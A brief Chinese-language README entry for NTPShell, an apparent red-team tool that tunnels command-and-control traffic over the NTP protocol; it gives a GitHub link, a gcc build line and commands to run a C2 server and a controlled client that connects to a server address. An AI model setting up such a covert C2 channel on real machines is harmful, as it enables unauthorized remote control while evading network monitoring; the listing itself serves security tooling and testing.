# NTPShell

**获取地址**：https://github.com/aplyc1a/NTPShell

通过NTP协议来负载C2数据。

**编译** 

```shell
gcc ntp.c -lpthread -o ntp
```

**使用**

```shell
c2服务端：./ntp -S
c2被控端：./ntp -C -s {server_addr}
```
